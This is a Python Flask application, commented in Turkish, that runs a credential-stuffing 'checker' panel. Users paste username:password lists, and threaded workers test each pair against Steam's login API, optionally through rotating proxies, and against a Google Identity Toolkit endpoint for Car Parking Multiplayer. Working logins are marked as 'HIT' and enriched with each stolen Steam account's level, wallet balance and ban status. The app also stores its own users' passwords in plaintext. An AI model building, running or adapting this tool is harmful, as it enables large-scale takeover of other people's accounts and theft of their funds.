import requests
import concurrent.futures
import re
import json
import base64
import time
import random
from flask import Flask, render_template, request, jsonify, redirect, url_for
from flask_sqlalchemy import SQLAlchemy
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5

app = Flask(__name__)
app.config['SECRET_KEY'] = 'wacked_99_secure'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///wacked.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login_page'

# --- VERİTABANI MODELLERİ ---
class User(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    email = db.Column(db.String(120), unique=True, nullable=False)
    password = db.Column(db.String(120), nullable=False)

with app.app_context():
    db.create_all()

@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))

# --- YARDIMCI FONKSİYONLAR ---
def fmt(n):
    return f"{int(n):,}".replace(",", ".")

# --- STEAM CHECKER MANTIK ---
def get_steam_details(session, steamid, access):
    details = {"level": "?", "balance": "0", "vac": "🟢Temiz"}
    try:
        # Level çekme
        r_lvl = session.get("https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/", 
                        params={"access_token": access, "steamid": steamid}, timeout=5)
        if r_lvl.status_code == 200:
            details["level"] = str(r_lvl.json().get("response", {}).get("player_level", "?"))
        
        # Bakiye çekme (Community Profil üzerinden deneme)
        r_store = session.get("https://store.steampowered.com/account/", timeout=5)
        m = re.search(r'id="header_wallet_balance"[^>]*>\s*([^<]+)', r_store.text)
        if m: details["balance"] = m.group(1).strip()
        
        # VAC Durumu
        r_ban = session.get("https://api.steampowered.com/ISteamUser/GetPlayerBans/v1/", 
                        params={"steamids": steamid}, timeout=5)
        if r_ban.status_code == 200:
            players = r_ban.json().get("players", [])
            if players and players[0].get("VACBanned"):
                details["vac"] = f"🔴VAC({players[0].get('NumberOfVACBans')}ban)"
    except Exception as e:
        print(f"Detay çekme hatası: {e}")
    return details

def check_steam(account, proxies=None):
    try:
        username, password = account.split(':')
        session = requests.Session()
        session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
        
        if proxies:
            px = random.choice(proxies)
            session.proxies = {"http": px, "https": px}

        # 1. RSA Key Al
        rsa_resp = session.get("https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1/",
                             params={"account_name": username}, timeout=8)
        rsa_data = rsa_resp.json().get("response")
        if not rsa_data: return {"status": "FAIL", "user": username, "info": "RSA Hatası"}
        
        key = RSA.construct((int(rsa_data["publickey_mod"], 16), int(rsa_data["publickey_exp"], 16)))
        enc_pwd = base64.b64encode(PKCS1_v1_5.new(key).encrypt(password.encode())).decode()

        # 2. Login Başlat
        auth_resp = session.post("https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1/",
                               data={"account_name": username, "encrypted_password": enc_pwd,
                                     "encryption_timestamp": rsa_data["timestamp"], "remember_login": "true",
                                     "website_id": "Community"}).json().get("response", {})

        if not auth_resp.get("steamid"):
            return {"status": "FAIL", "user": username, "info": "Hatalı Giriş"}

        # 3. Guard Kontrolü
        guards = [c.get("confirmation_type", 0) for c in auth_resp.get("allowed_confirmations", [])]
        if any(t in (2, 3, 4) for t in guards):
            return {"status": "2FA", "user": username, "info": "Guard Koruması"}

        # 4. Polling (Onay Bekle) - Süreyi biraz artırdık
        time.sleep(1.5)
        poll_resp = session.post("https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1/",
                           data={"client_id": auth_resp["client_id"], "request_id": auth_resp["request_id"]}).json().get("response", {})

        access = poll_resp.get("access_token")
        if not access:
            return {"status": "FAIL", "user": username, "info": "Token Alınamadı"}

        # 5. Detayları Çek
        det = get_steam_details(session, auth_resp["steamid"], access)
        return {
            "status": "HIT", "user": username, "pass": password,
            "info": f"Lvl: {det['level']} | Bakiye: {det['balance']} | VAC: {det['vac']}"
        }
    except Exception as e:
        print(f"Sistem Hatası ({account}): {e}")
        return {"status": "ERROR", "user": account, "info": str(e)}

# --- CAR PARKING MANTIK ---
def check_car_parking(account):
    try:
        user, password = account.split(':')
        login_url = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM"
        login_payload = {"email": user, "password": password, "returnSecureToken": True, "clientType": "CLIENT_TYPE_ANDROID"}
        r1 = requests.post(login_url, json=login_payload, timeout=10)
        if "idToken" in r1.json():
            return {"status": "HIT", "user": user, "pass": password, "info": "Giriş Başarılı (CPM)"}
        return {"status": "FAIL", "user": user}
    except: return {"status": "ERROR", "user": account}

# --- ROUTERLAR ---
@app.route('/')
def home(): return render_template('index.html', page='home')

@app.route('/login', methods=['GET', 'POST'])
def login_page():
    if request.method == 'POST':
        u, p = request.form.get('user_or_email'), request.form.get('password')
        user = User.query.filter((User.username == u) | (User.email == u)).first()
        if user and user.password == p:
            login_user(user); return redirect(url_for('checker_panel'))
    return render_template('index.html', page='login')

@app.route('/register', methods=['GET', 'POST'])
def register_page():
    if request.method == 'POST':
        u, e, p = request.form.get('username'), request.form.get('email'), request.form.get('password')
        new = User(username=u, email=e, password=p)
        db.session.add(new); db.session.commit()
        login_user(new); return redirect(url_for('checker_panel'))
    return render_template('index.html', page='register')

@app.route('/checker')
@login_required
def checker_panel(): return render_template('index.html', page='checker')

# --- ANA START NOKTASI ---
@app.route('/start', methods=['POST'])
@login_required
def start():
    data = request.json
    accs = [a for a in data.get('accounts', []) if ":" in a]
    thr = int(data.get('threads', 5))
    ctype = data.get('type', 'cpm')
    
    results = []
    print(f"İşlem Başlatıldı: {ctype.upper()} | Adet: {len(accs)}")

    with concurrent.futures.ThreadPoolExecutor(max_workers=thr) as ex:
        if ctype == 'steam':
            futures = [ex.submit(check_steam, a) for a in accs]
        else:
            futures = [ex.submit(check_car_parking, a) for a in accs]
            
        for f in concurrent.futures.as_completed(futures):
            res = f.result()
            results.append(res)
            print(f"Sonuç Alındı: {res.get('user')} -> {res.get('status')}")
            
    return jsonify(results)

@app.route('/logout')
def logout(): logout_user(); return redirect(url_for('home'))

if __name__ == '__main__':
    app.run(port=5000, debug=True)